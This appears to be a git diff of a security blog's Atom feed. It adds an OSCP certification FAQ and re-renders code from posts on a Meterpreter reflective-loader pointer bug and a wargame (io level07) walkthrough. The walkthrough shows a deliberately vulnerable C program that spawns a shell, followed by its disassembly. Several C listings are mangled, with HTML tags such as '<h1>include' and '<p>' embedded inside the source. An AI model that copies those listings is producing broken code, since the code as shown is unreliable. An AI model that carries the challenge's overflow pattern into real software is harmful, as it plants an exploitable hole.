@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Security | OJ's perspective]]></title>
   <link href="http://buffered.io/categories/security/atom.xml" rel="self"/>
   <link href="http://buffered.io/"/>
-  <updated>2013-11-17T09:55:16+10:00</updated>
+  <updated>2013-12-12T19:36:57+10:00</updated>
   <id>http://buffered.io/</id>
   <author>
     <name><![CDATA[OJ Reeves]]></name>
@@ -12,6 +12,62 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[OSCP FAQ]]></title>
+    <link href="http://buffered.io/posts/oscp-faq/"/>
+    <updated>2013-12-12T19:01:00+10:00</updated>
+    <id>http://buffered.io/posts/oscp-faq</id>
+    <content type="html"><![CDATA[<p>Since publishing the article that detailed my experiences with the <a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-backtrack/">PWB</a> labs and the <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">OSCP</a> exam, I have received scores of emails from potential and current students searching for more information and (quite often) hints. While I do my best to answer most of them, it's close to impossible to get to them all as my email debt is already way too high.</p>
+
+<p>From this point on I have decided not to respond to questions directly via email. This post will stand instead of those emails as a point of reference for common OSCP-related questions. As more questions come in I will update this post so that all future readers can benfit from the answers without me having to repost them.</p>
+
+<!--more-->
+
+
+<blockquote><p>Do I need to be good at programming to do PWB?</p></blockquote>
+
+<p>I'd say <em>no</em>, but it really does help. If you're not good with at least one language, then you're going to have a harder time and you'll probably end up needing to purchase time extensions to get through the labs. Scripting and coding is an important part of the experience, and it's something you really should be able to do. You could probably get through the labs without it, but it will be difficult. My recommendation is to go and spend time learning a language like <a href="http://www.python.org/">Python</a>, <a href="http://www.ruby-lang.org/">Ruby</a> or even <a href="http://en.wikipedia.org/wiki/Bash_(Unix_shell)">Bash</a> so that you have the ability to automate some of the tasks you'll have to take on.</p>
+
+<blockquote><p>Should I do OSCP first, or should I take on other certs (such as <a href="https://www.eccouncil.org/Certification/certified-ethical-hacker">CEH</a>, <a href="http://www.giac.org/certification/penetration-tester-gpen">GPEN</a> or <a href="http://mile2.com/penetration-testing-ethical-hacking/cpte.html">CPTE</a>) as preparation?</p></blockquote>
+
+<p>I haven't done CEH, GPEN or CPTE. In fact, to date, OSCP is the only security certification I have attempted to tackle (though I will be taking <a href="http://www.offensive-security.com/information-security-training/cracking-the-perimeter/">CTP</a> later this month with a goal of nailing <a href="http://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/">OSCE</a> in January). As a result I don't have a valid opinion of the quality or usefulness of the other certifications. My feeling is that it's down to you, dear reader, to determine which is best for you, just as I did when I was looking for a challenge. If you feel that OSCP is out of your depth then by all means go and find something easier.</p>
+
+<blockquote><p>Is there much web application hacking involved?</p></blockquote>
+
+<p>It's hard to quantify "much", but yes there is a bit of hacking of web applications involved. Some are known applications, some are custom applications built specifically for the labs. If you're not across the basics before you start, be prepared to ramp up quickly once your lab time commences.</p>
+
+<blockquote><p>Do I need to know about assembly language?</p></blockquote>
+
+<p>There are parts of the course which require you to have a basic understanding of assembly, though only x86 and not x64. I think it's a good idea to get your hands dirty prior to taking the course, because you will be using and adjusting exploits during your lab time.</p>
+
+<blockquote><p>How many hours per day did you spend in the labs? Is an hour per day enough?</p></blockquote>
+
+<p>The short answer is that I spent as many as I possibly could. I paid for just 30 days in the lab which meant that I had to force myself to push hard to get through as many machines as possible without having to pay for more time. It was a cost saver and a personal quest at the same time. On average, my guess is that I spent four or so hours per day, and more on weekends. One hour per day would not be enough, in my opinion, even if you booked 90 days worth of lab time.</p>
+
+<p>My recommendation is to do your best to have larger, unbroken blocks of time rather than lots of smaller chunks of time. This gives you the chance to immerse yourself in a problem and maximises the possibility of you solving it without the context-switching which can be really distruptive to your thought process.</p>
+
+<p>PWB is hard, don't expect to get through it in an hour per day unless you're a guru with lots of experience.</p>
+
+<blockquote><p>Can you please give me a hint for <strong>&lt;machine name&gt;</strong> in the PWB labs, because I'm stuck?</p></blockquote>
+
+<p>No. PWB and OSCP is all about learning to learn. The journey is probably more important than the final destination. I will not give hints, and if you ask for them you'll more than likely receive no response from me. If I do respond, I will probably just say "Try Harder".</p>
+
+<blockquote><p>Can I please see your lab notes?</p></blockquote>
+
+<p>Absolutely not.</p>
+
+<blockquote><p>I have been a developer for many years and want to try for OSCP, is it a waste of time?</p></blockquote>
+
+<p>No, it's not a waste of time, and yes you shoud try for it. This is exactly the scenario I was in, and I don't regret doing it for a one second. Also, I do believe that anyone who is involved with building production systems should do this course as it really does open your eyes. Most developers haven't really got much visibility of what things are like on the front line when it comes to security. This course is the kind of thing that will make them think much more defensively when writing their code.</p>
+
+<blockquote><p>Will OSCP provide me with the skills I need to be a penetration tester?</p></blockquote>
+
+<p>OSCP by itself will not. I think the only thing that can really give you the skills is experience. However, OSCP is a great start and it gives a great foundation on which to build a career as a penetration tester.</p>
+
+<p>In other words, don't stop learning!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[64bit Pointer Truncation in Meterpreter]]></title>
@@ -325,10 +381,11 @@ This exception may be expected and handled.
 
 <p>But why? It wasn't immediately obvious to me what the reason was, but I was keen to validate that this was the case. To prove my theory, I hacked the code a little so that the higher-order DWORD of the <code>pReflectiveLoader</code> value was used as the higher-order DWORD of <code>pDllMain</code> as well. The hack looked something like this:</p>
 
-<p>{% codeblock lang:c %}
-ULONG_PTR ulReflectiveLoaderBase = ((ULONG_PTR)pReflectiveLoader) &amp; (((ULONG_PTR)-1) ^ (0xFFFFFFFF));
-pDllMain = (DLLMAIN)(pReflectiveLoader() | ulReflectiveLoaderBase);
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">ULONG_PTR</span> <span class="n">ulReflectiveLoaderBase</span> <span class="o">=</span> <span class="p">((</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="n">pReflectiveLoader</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="p">(((</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="mh">0xFFFFFFFF</span><span class="p">));</span>
+</span><span class='line'><span class="n">pDllMain</span> <span class="o">=</span> <span class="p">(</span><span class="n">DLLMAIN</span><span class="p">)(</span><span class="n">pReflectiveLoader</span><span class="p">()</span> <span class="o">|</span> <span class="n">ulReflectiveLoaderBase</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>After the above code, <code>pDllMain</code> would have the same higher-order DWORD value as <code>pReflectiveLoader</code>. I compiled, deployed, executed ...</p>
 
@@ -348,37 +405,55 @@ pDllMain = (DLLMAIN)(pReflectiveLoader() | ulReflectiveLoaderBase);
 
 <p>The <code>pReflectiveLoader</code> pointer is a function pointer of a type defined like so:</p>
 
-<p>{% codeblock lang:c %}
-typedef DWORD (WINAPI * REFLECTIVELOADER)( VOID );
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="n">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">REFLECTIVELOADER</span><span class="p">)(</span> <span class="n">VOID</span> <span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>However, the <code>ReflectiveLoader()</code> function was defined in the source like so:</p>
 
-<p>{% codeblock lang:c %}</p>
-
-<h1>ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</h1>
-
-<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )</p>
-
-<h1>else</h1>
-
-<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )</p>
-
-<h1>endif</h1>
-
-<p>{</p>
-
-<pre><code>// ... snip ...
-</code></pre>
-
-<p>}
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">ifdef</span> <span class="n">REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">DLLEXPORT</span> <span class="n">ULONG_PTR</span> <span class="n">WINAPI</span> <span class="n">ReflectiveLoader</span><span class="p">(</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span> <span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="k">else</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">DLLEXPORT</span> <span class="n">ULONG_PTR</span> <span class="n">WINAPI</span> <span class="n">ReflectiveLoader</span><span class="p">(</span> <span class="n">VOID</span> <span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">endif</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="c1">// ... snip ...</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>So the function returns a <a href="http://msdn.microsoft.com/en-us/library/cc230394.aspx" title="ULONG_PTR">ULONG_PTR</a> (which is 64-bits) but the function pointer type returned a <a href="http://msdn.microsoft.com/en-us/library/cc230318.aspx" title="DWORD">DWORD</a> (which is 32-bits). This is what was causing the truncation of the pointer and effectively zeroing out the higher-order DWORD of <code>pDllMain</code>. The fix was to simply change the return type of the function pointer to match:</p>
 
-<p>{% codeblock lang:c %}
-typedef ULONG_PTR (WINAPI * REFLECTIVELOADER)( VOID );
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="n">ULONG_PTR</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">REFLECTIVELOADER</span><span class="p">)(</span> <span class="n">VOID</span> <span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Problem solved.</p>
 
@@ -409,43 +484,65 @@ probably due to high entropy ASLR making allocations over the 4gig boundary.</p>
 
 <p>We need to review a few snippets of code to understand why the compiler didn't complain. Firstly, the function-pointer type definition (prior to the fix):</p>
 
-<p>{% codeblock ReflectiveDllInjection.h (partial) lang:c %}
-typedef DWORD (WINAPI * REFLECTIVELOADER)( VOID );
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>ReflectiveDllInjection.h (partial)  </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="n">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">REFLECTIVELOADER</span><span class="p">)(</span> <span class="n">VOID</span> <span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Second, the declaration of the <code>ReflectiveLoader()</code> function:</p>
 
-<p>{% codeblock ReflectiveLoader.c (partial) lang:c %}</p>
-
-<h1>ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</h1>
-
-<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )</p>
-
-<h1>else</h1>
-
-<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )</p>
-
-<h1>endif</h1>
-
-<p>{
-   // ... snip ...
-}
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>ReflectiveLoader.c (partial)  </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">ifdef</span> <span class="n">REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">DLLEXPORT</span> <span class="n">ULONG_PTR</span> <span class="n">WINAPI</span> <span class="n">ReflectiveLoader</span><span class="p">(</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span> <span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="k">else</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">DLLEXPORT</span> <span class="n">ULONG_PTR</span> <span class="n">WINAPI</span> <span class="n">ReflectiveLoader</span><span class="p">(</span> <span class="n">VOID</span> <span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">endif</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">{</span>
+</span><span class='line'>   <span class="c1">// ... snip ...</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Third, the declaration of both <code>pDllMain</code> and <code>pReflectiveLoader</code>:</p>
 
-<p>{% codeblock LoadLibraryR.c (partial) lang:c %}
-REFLECTIVELOADER pReflectiveLoader = NULL;
-DLLMAIN pDllMain                   = NULL;
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>LoadLibraryR.c (partial)  </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">REFLECTIVELOADER</span> <span class="n">pReflectiveLoader</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span><span class='line'><span class="n">DLLMAIN</span> <span class="n">pDllMain</span>                   <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Finally, the actual calls that use these pointers:</p>
 
-<p>{% codeblock LoadLibraryR.c (partial) lang:c %}
-pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);
-// ... snip ...
-pDllMain = (DLLMAIN)pReflectiveLoader();
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>LoadLibraryR.c (partial)  </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pReflectiveLoader</span> <span class="o">=</span> <span class="p">(</span><span class="n">REFLECTIVELOADER</span><span class="p">)((</span><span class="n">UINT_PTR</span><span class="p">)</span><span class="n">lpBuffer</span> <span class="o">+</span> <span class="n">dwReflectiveLoaderOffset</span><span class="p">);</span>
+</span><span class='line'><span class="c1">// ... snip ...</span>
+</span><span class='line'><span class="n">pDllMain</span> <span class="o">=</span> <span class="p">(</span><span class="n">DLLMAIN</span><span class="p">)</span><span class="n">pReflectiveLoader</span><span class="p">();</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>As we can see, <code>pReflectiveLoader</code> is set via a cast from a <code>UINT_PTR</code> type, which maps to the right sized pointer for whatever platform it's compiled on. Casting a <code>UINT_PTR</code> to a <code>REFLECTIVELOADER</code> type doesn't change the size.</p>
 
@@ -636,16 +733,17 @@ pDllMain = (DLLMAIN)pReflectiveLoader();
 
 <p>Fire up a shell and connect to the game server with the password for the <code>level7</code> user (I won't be sharing passwords here).</p>
 
-<p>{% codeblock lang:bash %}
-$ ssh level7@io.smashthestack.org
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ssh level7@io.smashthestack.org
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Let's see what challenges there are for us:</p>
 
-<p>{% codeblock lang:bash %}
-level7@io:~$ ls /levels/level07*
-/levels/level07  /levels/level07_alt  /levels/level07_alt.c  /levels/level07.c
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:~<span class="nv">$ </span>ls /levels/level07*
+</span><span class='line'>/levels/level07  /levels/level07_alt  /levels/level07_alt.c  /levels/level07.c
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>This level has two possible entry points, and we'll be covering both in this post.</p>
 
@@ -653,37 +751,66 @@ level7@io:~$ ls /levels/level07*
 
 <p>We start by looking at the source of the target program:</p>
 
-<p>{% codeblock level07.c lang:c %}
-//written by bla</p>
-
-<h1>include &lt;stdio.h></h1>
-
-<h1>include &lt;string.h></h1>
-
-<h1>include &lt;unistd.h></h1>
-
-<p>int main(int argc, char **argv)
-{</p>
-
-<pre><code>    int count = atoi(argv[1]);
-    int buf[10];
-
-    if(count &gt;= 10 ) 
-            return 1;
-
-    memcpy(buf, argv[2], count * sizeof(int));
-
-    if(count == 0x574f4c46) {
-            printf("WIN!\n");
-            execl("/bin/sh", "sh" ,NULL);
-    } else
-            printf("Not today son\n");
-
-    return 0;
-</code></pre>
-
-<p>}
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>level07.c  </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">//written by bla&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>    <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">count</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">10</span> <span class="p">)</span>
+</span><span class='line'>            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">count</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mh">0x574f4c46</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WIN!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s">&quot;sh&quot;</span> <span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span> <span class="k">else</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Not today son</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>What's clear here is that we need to pass a number in that is less than <code>10</code>, but is big enough to allow us to overflow <code>buf</code> so that we can modify the value of <code>count</code>. The data that's written to <code>buf</code> is only allowed to be <code>count * sizeof(int)</code> in size.  We can easily pass in numbers smaller than 10, but they won't be big enough to overflow <code>buf</code>. If we pass in a <em>negative</em> number we bypass the check, but the call to <code>memcpy</code> will fail because <code>count * sizeof(int)</code> is negative.</p>
 
@@ -691,88 +818,152 @@ level7@io:~$ ls /levels/level07*
 
 <p>What's interesting about this is that <code>sizeof(int)</code> on a 32-bit machine is <code>4</code>, which is effectively a <code>SHL 2</code> operation. We can confirm this by disassembling <code>main</code> and looking at the generated output:</p>
 
-<p>{% codeblock lang:bash %}
-gdb$ disas main
-Dump of assembler code for function main:
-0x08048414 &lt;main+0>:    push   ebp
-0x08048415 &lt;main+1>:    mov    ebp,esp
-0x08048417 &lt;main+3>:    sub    esp,0x68
-0x0804841a &lt;main+6>:    and    esp,0xfffffff0
-0x0804841d &lt;main+9>:    mov    eax,0x0
-0x08048422 &lt;main+14>:   sub    esp,eax
-0x08048424 &lt;main+16>:   mov    eax,DWORD PTR [ebp+0xc]
-0x08048427 &lt;main+19>:   add    eax,0x4
-0x0804842a &lt;main+22>:   mov    eax,DWORD PTR [eax]
-0x0804842c &lt;main+24>:   mov    DWORD PTR [esp],eax
-0x0804842f &lt;main+27>:   call   0x8048354 &lt;atoi@plt>
-0x08048434 &lt;main+32>:   mov    DWORD PTR [ebp-0xc],eax
-0x08048437 &lt;main+35>:   cmp    DWORD PTR [ebp-0xc],0x9
-0x0804843b &lt;main+39>:   jle    0x8048446 &lt;main+50>
-0x0804843d &lt;main+41>:   mov    DWORD PTR [ebp-0x4c],0x1
-0x08048444 &lt;main+48>:   jmp    0x80484ad &lt;main+153>
-0x08048446 &lt;main+50>:   mov    eax,DWORD PTR [ebp-0xc]
-0x08048449 &lt;main+53>:   shl    eax,0x2                          <- here
-0x0804844c <main+56>:   mov    DWORD PTR [esp+0x8],eax
-0x08048450 &lt;main+60>:   mov    eax,DWORD PTR [ebp+0xc]
-0x08048453 &lt;main+63>:   add    eax,0x8
-0x08048456 &lt;main+66>:   mov    eax,DWORD PTR [eax]
-0x08048458 &lt;main+68>:   mov    DWORD PTR [esp+0x4],eax
-0x0804845c &lt;main+72>:   lea    eax,[ebp-0x48]
-0x0804845f &lt;main+75>:   mov    DWORD PTR [esp],eax
-0x08048462 &lt;main+78>:   call   0x8048334 &lt;memcpy@plt>
-0x08048467 &lt;main+83>:   cmp    DWORD PTR [ebp-0xc],0x574f4c46
-0x0804846e &lt;main+90>:   jne    0x804849a &lt;main+134>
-0x08048470 &lt;main+92>:   mov    DWORD PTR [esp],0x8048584
-0x08048477 &lt;main+99>:   call   0x8048344 &lt;printf@plt>
-0x0804847c &lt;main+104>:  mov    DWORD PTR [esp+0x8],0x0
-0x08048484 &lt;main+112>:  mov    DWORD PTR [esp+0x4],0x804858a
-0x0804848c &lt;main+120>:  mov    DWORD PTR [esp],0x804858d
-0x08048493 &lt;main+127>:  call   0x8048324 &lt;execl@plt>
-0x08048498 &lt;main+132>:  jmp    0x80484a6 &lt;main+146>
-0x0804849a &lt;main+134>:  mov    DWORD PTR [esp],0x8048595
-0x080484a1 &lt;main+141>:  call   0x8048344 &lt;printf@plt>
-0x080484a6 &lt;main+146>:  mov    DWORD PTR [ebp-0x4c],0x0
-0x080484ad &lt;main+153>:  mov    eax,DWORD PTR [ebp-0x4c]
-0x080484b0 &lt;main+156>:  leave<br/>
-0x080484b1 &lt;main+157>:  ret  <br/>
-End of assembler dump.
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
